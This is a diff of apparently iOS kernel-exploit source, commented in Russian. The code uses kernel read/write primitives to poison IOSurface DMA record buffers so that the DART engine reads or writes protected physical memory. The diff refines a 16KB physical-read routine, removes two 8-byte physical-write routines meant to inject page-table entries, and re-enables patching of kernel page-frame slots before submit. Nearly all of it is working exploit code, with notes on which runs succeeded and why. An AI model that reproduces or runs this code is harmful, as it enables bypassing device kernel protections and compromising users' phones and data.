@@ -140,35 +140,26 @@ static uint64_t kpZoneVtoP(uint64_t va)
     return 0;
 }
 
-// 1.9.255 (р.64): physread 16KB через DART — СВЕЖАЯ поверхность-жертва на каждое
-// чтение. Р.64 доказал асимметрию кэшей: dst-маппинг персистентен (яд до 1-го опа
-// = кэш отравлен — write работает ×6), а src ре-маппится каждый оп из cmd/wire
-// кэша (патч буфера ПОСЛЕ первого опа мимо — sig=0x41 ×5). Гарантия р.64 Q1:
-// никогда-не-сабмитившаяся поверхность ВСЕГДА идёт полным путём (пустой cmd-слот
-// → prepare full-map → сериализация из её record buffer). Патчим её буфер на
-// targetPA>>14 ДО первого submit: DMA читает deadly-страницу как контент src
-// и кладёт в dstS. Поверхность выпускаем после чтения.
-// 1.9.259 (р.64/65): physread через DART — своя пара + rect {x,y,w,h} (р.65 Q4:
-// TSD +0xdc=x, +0xe0=y, +0xe4=w, +0xec=h; на 1024-BGRA {194,0,2,1} = ровно 8
-// байт 0x308-0x30f = одна L3-запись). Свежий pipe + своя пара 1024×64 — кэш-мисс
-// по (off,len=0,0x40000), identity по dims. DMA читает целевую страницу как
-// контент rdS и кладёт rect-регион в dsS.
+// 1.9.252: physread 16KB через DART — патчим entry[0] record buffer'а
+// SRC-поверхности на targetPA>>14 и сабмитим НОРМАЛЬНЫМ направлением: DMA читает
+// охраняемую страницу (deadly для CPU — SPTM не смотрит на DART) как содержимое
+// src и кладёт её в dst-поверхность, которую мы читаем с юзер-стороны.
+// (Swap-вариант 1.9.252a мёртв: обратное направление опа дропается молча, 2/2.)
+// Рет YES = out заполнен 0x4000 байтами targetPA-страницы.
+// 1.9.272 (р.64/67): physread 16KB через DART — СВОЯ пара 1024×16 (материализованная:
+// backing ленивый — rdPA=0 в 255-260 = оп молча дропался), свежий pipe, патч ВСЕХ
+// записей rd-буфера на targetPA>>14 ДО первого submit (первый map = сериализация из
+// record buffer). Rect {0,0,1024,4} = полные 16KB сплошь (stride 0x1000).
 static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
-                          uint64_t targetPA, uint32_t rx, uint32_t ry, uint32_t rw, uint32_t rh,
-                          uint8_t *out, NSMutableString *r)
+                          uint64_t targetPA, uint8_t *out, NSMutableString *r)
 {
     memset(out, 0, 0x4000);
-    // 1.9.259b: пара 4096×16 BGRA (stride 0x4000) — любой оффсет 16KB-страницы
-    // ложится на y=0 (x=boff/4 ≤ 4094): rect с y≠0 не работает (ноль, 259-я),
-    // а 16KB-оффсеты L3-записей требуют y>0 на 1024-широких поверхностях.
-    // (off,len) ключ кэша = 0x40000 — конфликта с srcS/dstS (0x80000) нет.
-    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @16,
+    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @16,
                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
     IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
     IOSurfaceRef dsS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
     if (!rdS || !dsS) { if (rdS) CFRelease(rdS); if (dsS) CFRelease(dsS); return NO; }
-    // 1.9.268: МАТЕРИАЛИЗАЦИЯ backing ДО резолва/патча — иначе backing лениво не
-    // существует (rdPA=0 в 255-260), опу нечего маппить → молчий дроп → sig=0.
+    // материализация backing ДО резолва/патча (урок 255-260: rdPA=0 → дроп)
     IOSurfaceLock(rdS, 0, NULL);
     uint8_t *rp0 = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
     if (rp0) memset(rp0, 0x5A, 0x4000);
@@ -219,20 +210,16 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
         io_connect_t v2 = IO_OBJECT_NULL;
         kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
         if (ok2 == KERN_SUCCESS && v2) {
-            uint64_t tpage = targetPA & ~0x3fffULL;
-            uint32_t tPFN = (uint32_t)(tpage >> 14);
+            uint32_t tPFN = (uint32_t)((targetPA & ~0x3fffULL) >> 14);
             uint32_t cntR = (uint32_t)early_kread64(rdBuf + 0x28);
             if (cntR > 64) cntR = 64;
-            // 1.9.268 (р.67): патчим ВСЕ записи rd-буфера (не только entry[0]) —
-            // потребляемый индекс не всегда 0; CFRelease(rdS) унесёт яд с собой.
             for (uint32_t i = 0; i < cntR; i++) {
                 uint64_t e = early_kread64(rdBuf + 0x30 + (uint64_t)i * 8);
                 usleep(300);
                 early_kwrite64(rdBuf + 0x30 + (uint64_t)i * 8, (e & 0xffffffff00000000ULL) | tPFN);
             }
+            // р.68: bit1=0 + [buf+0x10]=0 последними записями перед submit
             uint8_t fR = 0; kreadbuf(rdBuf + 0x2d, &fR, 1);
-            // 1.9.271 (р.68): зануляем и stale-сегменты [buf+0x10] — иначе при bit1=1
-            // op-4 отдаёт их (оригинальные PA) мимо наших отравленных entries.
             uint64_t sR = early_kread64(rdBuf + 0x10);
             if (sR) early_kwrite64(rdBuf + 0x10, 0);
             if (fR & 0x02) {
@@ -244,22 +231,21 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
             *(uint32_t *)(tsdR + 0) = rdID;
             *(uint32_t *)(tsdR + 4) = dsID;
             *(uint64_t *)(tsdR + 8) = 1;
-            *(uint32_t *)(tsdR + 0x0C) = rw;
-            *(uint32_t *)(tsdR + 0x10) = rh;
-            *(uint32_t *)(tsdR + 0xdc) = rx;   // rect x (р.65 Q4: parser 0x928e854)
-            *(uint32_t *)(tsdR + 0xe0) = ry;   // rect y
-            *(uint32_t *)(tsdR + 0xe4) = rw;   // rect w
-            *(uint32_t *)(tsdR + 0xec) = rh;   // rect h
+            *(uint32_t *)(tsdR + 0x0C) = 1024;
+            *(uint32_t *)(tsdR + 0x10) = 4;
+            *(uint32_t *)(tsdR + 0xdc) = 0;   // rect x
+            *(uint32_t *)(tsdR + 0xe0) = 0;   // rect y
+            *(uint32_t *)(tsdR + 0xe4) = 1024;// rect w
+            *(uint32_t *)(tsdR + 0xec) = 4;   // rect h
             kern_return_t rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdR, sizeof(tsdR), NULL, NULL, NULL, NULL);
             usleep(400000);
-            IOServiceClose(v2);   // 1.9.268: restore не нужен — CFRelease(rdS) ниже унесёт яд с поверхностью
+            IOServiceClose(v2);   // restore не нужен — CFRelease(rdS) унесёт яд с поверхностью
             IOSurfaceLock(dsS, 0, NULL);
             uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dsS);
-            uint32_t rlen = rw * rh * 4; if (rlen > 0x4000) rlen = 0x4000;
-            if (spR) memcpy(out, spR + (uint64_t)ry * 0x4000 + (uint64_t)rx * 4, rlen);   // stride 0x4000 (4096-wide)
+            if (spR) memcpy(out, spR, 0x4000);
             IOSurfaceUnlock(dsS, 0, NULL);
-            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx rect{%u,%u,%u,%u} kr=0x%x sig=%#010x flags=%#x",
-                      (unsigned long long)targetPA, rx, ry, rw, rh, rkr, *(uint32_t *)out, fR]);
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x",
+                      (unsigned long long)targetPA, rkr, *(uint32_t *)out, fR]);
             done = YES;
         } else {
             kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] fresh pipe: open kr=0x%x", ok2]);
@@ -270,139 +256,6 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
     CFRelease(rdS);
     CFRelease(dsS);
     return done;
-}
-
-// 1.9.261: physwrite РОВНО 8 байт по targetPA+boff — своя пара 4096×16 (stride
-// 0x4000, boff ложится на y=0): wdS (приёмник, его record buffer патчим на
-// targetPA>>14) + rdS (источник, payload по +boff). Свежий pipe = полная
-// сериализация с ядом. Для L3-инжекции: boff = idx*8 → одна L3-запись.
-static BOOL kpPhysWrite8v2(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
-                           uint64_t targetPA, uint32_t boff, uint64_t payload, NSMutableString *r)
-{
-    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @16,
-                          (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
-    IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
-    IOSurfaceRef wdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
-    if (!rdS || !wdS) { if (rdS) CFRelease(rdS); if (wdS) CFRelease(wdS); return NO; }
-    BOOL done = NO;
-    uint64_t wdVA = 0, wdBuf = 0;
-    uint32_t rdID = IOSurfaceGetID(rdS);
-    uint32_t wdID = IOSurfaceGetID(wdS);
-    typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
-    CreateMachPort_t pCmp = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
-    mach_port_t mp = pCmp ? pCmp(wdS) : 0;
-    if (mp) {
-        uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (mp >> 8);
-        uint64_t pVA = kp_untag_ptr(early_kread64(eVA + off_ipc_entry_ie_object));
-        uint64_t kobj = kpLooksLikeKernelPointer(pVA) ? kp_untag_ptr(early_kread64(pVA + off_ipc_port_ip_kobject)) : 0;
-        uint64_t fobj = kpLooksLikeKernelPointer(kobj) ? kp_untag_ptr(early_kread64(kobj + 0x30)) : 0;
-        uint64_t kslide = kconstant(base) - 0xfffffff007004000ULL;
-        if (kpLooksLikeKernelPointer(fobj) && kp_untag_ptr(early_kread64(fobj)) == 0xfffffff007eef4c8ULL + kslide) {
-            uint64_t cand = kp_untag_ptr(early_kread64(fobj + 0x18));
-            if (kpLooksLikeKernelPointer(cand) && (uint32_t)early_kread64(cand + 0x10) == wdID) wdVA = cand;
-        }
-        mach_port_destroy(mach_task_self(), mp);
-    }
-    if (wdVA) {
-        uint64_t pd = kp_untag_ptr(early_kread64(wdVA + 0x30));
-        uint64_t typ = pd ? (early_kread64(pd + 0x20) & 0xf0) : 0;
-        uint64_t hdr = (typ == 0x10) ? kp_untag_ptr(early_kread64(pd + 0x90)) : 0;
-        uint64_t buf = hdr ? kp_untag_ptr(early_kread64(hdr + 0x10)) : 0;
-        uint32_t cnt = buf ? (uint32_t)early_kread64(buf + 0x28) : 0;
-        uint64_t e0 = buf ? early_kread64(buf + 0x30) : 0;
-        if (buf && cnt && cnt < 0x1000 && (uint32_t)e0 != 0 &&
-            ((uint32_t)(e0 >> 32) == 0 || (uint32_t)(e0 >> 32) == 4)) wdBuf = buf;
-    }
-    if (wdBuf) {
-        uint64_t tpage = targetPA & ~0x3fffULL;
-        uint64_t eSave = early_kread64(wdBuf + 0x30);
-        usleep(1500);
-        early_kwrite64(wdBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
-        // 1.9.271 (р.68): и на записи — bit1=0 + [buf+0x10]=0, иначе stale-ветка
-        // отдаёт buffer+0x10 (оригинальные PA) мимо пропатченных записей.
-        {
-            uint8_t fw = 0; kreadbuf(wdBuf + 0x2d, &fw, 1);
-            uint64_t sW = early_kread64(wdBuf + 0x10);
-            if (sW) early_kwrite64(wdBuf + 0x10, 0);
-            if (fw & 0x02) {
-                uint64_t fl = early_kread64(wdBuf + 0x28);
-                early_kwrite64(wdBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fw & ~0x02) << 40));
-            }
-        }
-        IOSurfaceLock(rdS, 0, NULL);
-        uint8_t *rpix = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
-        if (rpix) *(uint64_t *)(rpix + boff) = payload;
-        IOSurfaceUnlock(rdS, 0, NULL);
-        io_connect_t v2 = IO_OBJECT_NULL;
-        kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
-        if (ok2 == KERN_SUCCESS && v2) {
-            uint8_t tsdW[0x1B0];
-            memcpy(tsdW, tsdV, sizeof(tsdW));
-            *(uint32_t *)(tsdW + 0) = rdID;
-            *(uint32_t *)(tsdW + 4) = wdID;
-            *(uint64_t *)(tsdW + 8) = 1;
-            *(uint32_t *)(tsdW + 0x0C) = 2;
-            *(uint32_t *)(tsdW + 0x10) = 1;
-            *(uint32_t *)(tsdW + 0xdc) = (boff % 0x4000) / 4;   // rect x (stride 0x4000 → y=0)
-            *(uint32_t *)(tsdW + 0xe0) = boff / 0x4000;
-            *(uint32_t *)(tsdW + 0xe4) = 2;
-            *(uint32_t *)(tsdW + 0xec) = 1;
-            kern_return_t rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdW, sizeof(tsdW), NULL, NULL, NULL, NULL);
-            usleep(400000);
-            IOServiceClose(v2);
-            kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8v2] target=%#llx+%#x payload=%#018llx kr=0x%x",
-                      (unsigned long long)targetPA, boff, payload, rkr]);
-            done = (rkr == 0);
-        }
-        early_kwrite64(wdBuf + 0x30, eSave);
-    } else {
-        kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8v2] wdVA/wdBuf нет (wdVA=%#llx)", (unsigned long long)wdVA]);
-    }
-    CFRelease(rdS);
-    CFRelease(wdS);
-    return done;
-}
-
-// 1.9.259: physwrite РОВНО 8 байт в targetPA+0x308 через rect {194,0,2,1}
-// (1024-BGRA: байты 0x308-0x30f = одна L3-запись, р.65 Q4). Патчим entry[0]
-// dst-буфера на targetPA>>14, payload кладём в src+0x308, submit на СВЕЖЕМ pipe
-// (dst пересериализуется с ядом). Остальные 2047 qword'ов страницы не тронуты.
-static BOOL kpPhysWrite8(io_service_t svc, uint64_t dstBuf, uint32_t srcID, uint32_t dstID,
-                         IOSurfaceRef srcS, const uint8_t *tsdV, uint64_t targetPA, uint64_t payload,
-                         NSMutableString *r)
-{
-    if (!dstBuf || !srcS) return NO;
-    uint64_t tpage = targetPA & ~0x3fffULL;
-    uint64_t eSave = early_kread64(dstBuf + 0x30);
-    usleep(1500);
-    early_kwrite64(dstBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
-    IOSurfaceLock(srcS, 0, NULL);
-    uint8_t *spW = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
-    if (spW) *(uint64_t *)(spW + 0x308) = payload;
-    IOSurfaceUnlock(srcS, 0, NULL);
-    io_connect_t v2 = IO_OBJECT_NULL;
-    kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
-    kern_return_t rkr = -1;
-    if (ok2 == KERN_SUCCESS && v2) {
-        uint8_t tsdW[0x1B0];
-        memcpy(tsdW, tsdV, sizeof(tsdW));
-        *(uint32_t *)(tsdW + 0) = srcID;
-        *(uint32_t *)(tsdW + 4) = dstID;
-        *(uint64_t *)(tsdW + 8) = 1;
-        *(uint32_t *)(tsdW + 0x0C) = 2;
-        *(uint32_t *)(tsdW + 0x10) = 1;
-        *(uint32_t *)(tsdW + 0xdc) = 194;   // rect x → байты 0x308-0x30f
-        *(uint32_t *)(tsdW + 0xe0) = 0;     // rect y
-        *(uint32_t *)(tsdW + 0xe4) = 2;     // rect w (2 пикселя = 8 байт)
-        *(uint32_t *)(tsdW + 0xec) = 1;     // rect h
-        rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdW, sizeof(tsdW), NULL, NULL, NULL, NULL);
-        usleep(400000);
-        IOServiceClose(v2);
-    }
-    early_kwrite64(dstBuf + 0x30, eSave);
-    kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8] target=%#llx payload=%#018llx kr=0x%x",
-              (unsigned long long)targetPA, payload, rkr]);
-    return ok2 == KERN_SUCCESS && rkr == 0;
 }
 
 // The EL2 domain faults in the physical aperture when read via the socket
@@ -6571,12 +6424,26 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
             if (nSlots) {
                 rangesVA = slotVAs[0];   // совместимость со старым кодом ниже
-                // 1.9.265: запись слотов ВЫКЛЮЧЕНА — таблица по 122 прогонам захвата:
-                // проигрышные буты = те, где слот нашёлся и был пропатчен; победные
-                // = без слота (nSlots=0). Патч {ctlPFN<<32|count} ломал запись в них.
-                kpNote(r, [NSString stringWithFormat:@"  ★ surfVA=%#llx, слотов найдено %d — НЕ ПАТЧИМ (патч ломал запись в таких бутах, таблица 122 прогонов)",
-                          (unsigned long long)surfVA, nSlots]);
-                nSlots = 0;
+                int stuck = 0;
+                for (int j = 0; j < nSlots; j++) {
+                    uint64_t newQ = (slotForm[j] == 1)
+                                  ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
+                                  : (slotForm[j] == 2) ? ctlPA
+                                  : (slotForm[j] == 3) ? (ctlPA >> 14)
+                                  : (slotForm[j] == 5) ? ((origQs[j] & 0xFFFF000000000000ULL) | ctlPA)
+                                  : (slotForm[j] == 6) ? ((origQs[j] & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL))
+                                  : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
+                    newQs[j] = newQ;
+                    early_kwrite64(slotVAs[j], newQ);
+                    uint64_t rb = early_kread64(slotVAs[j]);
+                    if (rb == newQ) stuck++;
+                    kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА слот#%d %#018llx → %#018llx — %@",
+                              j, (unsigned long long)origQs[j], (unsigned long long)newQ,
+                              rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
+                }
+                kpNote(r, [NSString stringWithFormat:@"  ★ surfVA=%#llx, пропатчено %d/%d слотов ДО submit",
+                          (unsigned long long)surfVA, stuck, nSlots]);
+                if (!stuck) nSlots = 0;   // запись не липнет — откат к старым путям
             } else {
                 kpNote(r, @"  IOSurface найден, но pfn-слотов нет — уходим в старые пути");
             }
@@ -6630,11 +6497,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // паника назовёт адрес (x1), остальное не тронуто.
     uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
     int nDep = 0;
-    uint64_t buf247 = 0, flOld247 = 0, dq252 = 0;   // 1.9.248: record buffer CHAIN + flags-оригинал — пост-submit дампы (H1 rebuild vs H2 mapper-игнор); 1.9.257: dq252 = dst entry-оригинал для physread
-    // 1.9.266 (р.66): pd/hdr на уровне функции для протокола схождения L5;
-    // allBuf/allOld/allCnt — патч ВСЕХ записей record buffer (не только page-0, L6).
-    uint64_t pd247 = 0, hdr247 = 0;
-    uint64_t allBuf = 0; uint32_t allCnt = 0; uint64_t allOld[64] = {0};
+    uint64_t buf247 = 0, flOld247 = 0;   // 1.9.248: record buffer CHAIN + flags-оригинал — пост-submit дампы (H1 rebuild vs H2 mapper-игнор)
     // 1.9.247: CHAIN (р.61) — АВТОРИТЕТНЫЙ record buffer дескриптора, ноль сканов.
     // Цепочка: [surf+0x30]=pd → [pd+0x90]=hdr → [hdr+0x10]=buffer;
     // buffer+0x28=count (0x20=32 стр. для 512KB), +0x2d=flags(bit1=built),
@@ -6643,10 +6506,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // (hi32=4 сохраняем — флаг mapped), submit с bit43=0 (уже в tsdV) перестраивает
     // PTE из отравленного буфера. Маркеры на каждом шаге = самопроверка.
     if (pfn32 && ctlPFN) {
-        pd247 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t pd247 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
         uint64_t vt247 = pd247 ? kp_untag_ptr(early_kread64(pd247)) : 0;
         uint64_t typ247 = pd247 ? (early_kread64(pd247 + 0x20) & 0xf0) : 0;
-        hdr247 = (typ247 == 0x10) ? kp_untag_ptr(early_kread64(pd247 + 0x90)) : 0;
+        uint64_t hdr247 = (typ247 == 0x10) ? kp_untag_ptr(early_kread64(pd247 + 0x90)) : 0;
         buf247 = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
         uint32_t cnt247 = buf247 ? (uint32_t)early_kread64(buf247 + 0x28) : 0;
         uint8_t bfl247 = 0; if (buf247) kreadbuf(buf247 + 0x2d, &bfl247, 1);
@@ -6669,18 +6532,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
                 hitAddr[nDep] = buf247 + 0x30 + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
             }
-            // 1.9.266 (р.66 L6): патчим ВСЕ записи record buffer, не только page-0 —
-            // потребляемая запись не всегда entry[0] (индекс = (cursor+suboff)>>14);
-            // coalescing loop сольёт их в один сегмент → первая страница = ctlPA.
-            // Оригиналы в allOld[] — restore в финале. L5 (realloc буфера) ловим в
-            // retry перечитыванием [hdr+0x10] на каждой попытке.
-            if (nDep && buf247 && cnt247 && cnt247 <= 64) {
-                for (uint32_t i = 0; i < cnt247; i++) allOld[i] = early_kread64(buf247 + 0x30 + (uint64_t)i * 8);
-                allCnt = cnt247; allBuf = buf247;
-                for (uint32_t i = 0; i < cnt247; i++)
-                    early_kwrite64(buf247 + 0x30 + (uint64_t)i * 8, (allOld[i] & 0xffffffff00000000ULL) | ctlPFN);
-                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] все %u записей отравлены (L6 убит — слияние сегментов даст ctlPA)", cnt247]);
-            }
             // 1.9.250 (р.62): bit1 SET = STALE-ветка — op-4 отдаёт старые сегменты
             // buffer+0x10, entries НЕ читаются (ошибка 248-й: яд нетронут, PTE мимо).
             // Нужен bit1 CLEAR: сериализатор читает entries напрямую (0x86eae2c:
@@ -6695,91 +6546,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"  [CHAIN] гарант serialize (bit1 clear): flags %#x → %#x — %@", bfl247, fck, !(fck & 0x02) ? @"ВСТАЛО" : @"МИМО"]);
             }
         }
-        // 1.9.259 (р.65 Q3): type-0x20 → ranges-путь — записи {addr,len} stride 0x10
-        // по [pd+0x60], addr идёт СЫРО как PA (0x86eac8c-98). ranges[0].addr=ctlPA.
-        if (typ247 == 0x20) {
-            uint64_t rng = kp_untag_ptr(early_kread64(pd247 + 0x60));
-            uint64_t a0 = kpLooksLikeKernelPointer(rng) ? early_kread64(rng + 0x00) : 0;
-            uint64_t l0 = kpLooksLikeKernelPointer(rng) ? early_kread64(rng + 0x08) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  [CHAIN] type-0x20 ranges: rng=%#llx [0]={%#018llx,%#018llx} — %@",
-                      (unsigned long long)rng, (unsigned long long)a0, (unsigned long long)l0,
-                      kpLooksLikeKernelPointer(rng) ? @"патчим addr=ctlPA" : @"rng нет"]);
-            if (kpLooksLikeKernelPointer(rng) && nDep < 24) {
-                usleep(1500);
-                early_kwrite64(rng + 0x00, ctlPA);
-                uint64_t rb = early_kread64(rng + 0x00);
-                kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
-                hitAddr[nDep] = rng + 0x00; hitOld[nDep] = a0; hitForm[nDep] = 6; nDep++;
-            }
-        }
-        // 1.9.259 (р.65 Q1-L4): trailer-запись (buffer+0x30+cnt*8): +0x08 = внешний
-        // plist, +0x20 = флаги; bit1 SET = DIRECT-PTR — читается ВНЕШНИЙ оригинальный
-        // список, наши inline-записи мимо (подпись бута 258: яд нетронут, DMA в
-        // оригинал). Патчим и внешний список тоже.
-        if (buf247 && cnt247 && cnt247 < 0x1000) {
-            uint64_t tr = buf247 + 0x30 + (uint64_t)cnt247 * 8;
-            uint64_t tPlist = early_kread64(tr + 0x08);
-            uint64_t tFlags = early_kread64(tr + 0x20);
-            kpNote(r, [NSString stringWithFormat:@"  [CHAIN] trailer: plist=%#018llx flags=%#018llx — режим %@",
-                      (unsigned long long)tPlist, (unsigned long long)tFlags,
-                      (tFlags & 0x02) ? @"DIRECT-PTR (внешний список!)" : @"inline"]);
-            if ((tFlags & 0x02) && kpLooksLikeKernelPointer(tPlist)) {
-                for (uint32_t i = 0; i < 64 && nDep < 24; i++) {
-                    uint64_t e = early_kread64(tPlist + (uint64_t)i * 8);
-                    if ((uint32_t)e != pfn32) continue;
-                    if (!((uint32_t)(e >> 32) == 0 || (uint32_t)(e >> 32) == 4)) continue;
-                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] ★ внешний список entry[%u] @ %#llx: %#018llx → ctlPFN %#x",
-                              i, (unsigned long long)(tPlist + (uint64_t)i * 8), (unsigned long long)e, ctlPFN]);
-                    usleep(1500);
-                    early_kwrite64(tPlist + (uint64_t)i * 8, (e & 0xffffffff00000000ULL) | ctlPFN);
-                    uint64_t rb = early_kread64(tPlist + (uint64_t)i * 8);
-                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                    hitAddr[nDep] = tPlist + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
-                    break;
-                }
-            }
-        }
-        // 1.9.264: VA-FIELD по маркеру — в проигрышных бутах (258/259/262c) сериализатор
-        // идёт по ranges и ТРАНСЛИРУЕТ addr = VA бэкинга dst (р.65 Q3 + р.60 translator
-        // [0xaae20d0] vt+0x568). Ищем в родителе MD [pd+0x60] qword-поле, чьё содержимое
-        // = маркер backing dst (0x41544159) — это его kernel VA — и подменяем на
-        // phystokv(ctlPA): транслятор посчитает ctlPA сам. Третья цель за проход.
-        {
-            uint64_t parMD = pd247 ? kp_untag_ptr(early_kread64(pd247 + 0x60)) : 0;
-            uint64_t ctlKVA = (ctlPA && gPrimitives.phystokv) ? gPrimitives.phystokv(ctlPA) : 0;
-            if (kpLooksLikeKernelPointer(parMD) && kpSafeToRead(parMD) && ctlKVA) {
-                for (uint32_t o = 0; o + 8 <= 0x200 && nDep < 24; o += 8) {
-                    uint64_t F = kp_untag_ptr(early_kread64(parMD + o));
-                    if (!kpLooksLikeKernelPointer(F)) continue;
-                    uint64_t m = early_kread64(F);
-                    if ((uint32_t)m != 0x41544159) continue;
-                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] ★ VA-поле родителя +%#x: %#llx (контент=%#018llx) → ctlKVA %#llx",
-                              o, (unsigned long long)F, (unsigned long long)m, (unsigned long long)ctlKVA]);
-                    usleep(1500);
-                    early_kwrite64(parMD + o, ctlKVA);
-                    uint64_t rb = early_kread64(parMD + o);
-                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
-                    hitAddr[nDep] = parMD + o; hitOld[nDep] = F; hitForm[nDep] = 7; nDep++;
-                }
-            }
-        }
     }
-    // 1.9.262: FAST-PATH — CHAIN вооружён (nDep>0) → прыгаем поверх всей
-    // диагностической середины (зависание 262-го в SPC-fallback + окно мины):
-    // прямо victim#1 → retry. Хоистим объявления, чьи присвоения живут в
-    // пропускаемом спане (прыжок покрывает только C-типы; ObjC-временные
-    // остаются внутри вложенных блоков — ARC-safe).
-    uint64_t vaFldObj = 0, vaFldOld = 0; uint32_t vaFldOff = 0;
-    uint64_t parHitArr = 0, parHitOld = 0; uint32_t parHitOff = 0;
-    uint64_t ownHitArr = 0, ownHitOld = 0; uint32_t ownHitOff = 0;
-    uint64_t rmdHitArr = 0, rmdHitOld = 0; uint32_t rmdHitOff = 0;
-    uint64_t specVA[8] = {0}, specOld[8] = {0}; int nSpec = 0;
-    int changed = 0;
-    // 1.9.270: fast-path ОТКАТЁН — данные по бутам: медленный путь ~75% побед,
-    // fast-path 0/6. Середина (фазы VAD/PAR/OWN/RMD/SPC) даёт ~60с дозревания
-    // record buffer до victim#1 — без него сериализатор читает незрелое/оригинал.
-    // if (nDep) goto kpx_submit1;   // ВЫКЛЮЧЕНО
-
     // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
     // submit, до 9+ секунд DEP-скана = вне окна мины). zone-VA по значению хита
     // (physmap-записей ноль — урок 220/242), классификатор зоны р.59 в лог,
@@ -6951,6 +6718,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // пикселей dst (контент-проверка, walker не нужен) и подменяем на ctlKVA:
     // prepare посчитает vtophys(ctlKVA)=ctlPA и драйвер сам запишет PTE.
     // Оригинал возвращаем после execute (teardown-safety).
+    uint64_t vaFldObj = 0, vaFldOld = 0;
+    uint32_t vaFldOff = 0;
     kpNote(r, @"  [PH] VAD (VA-field deputy) — старт");   // 1.9.244 крошка фаз
     if (ctlKVA) {
         uint64_t pd198 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;   // plane(+0x30) — как в pd-дампе
@@ -7037,6 +6806,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // (lvl1-дамп: [+0x60]=arr, count=16384) в обычной VMEM-полосе (не physmap!).
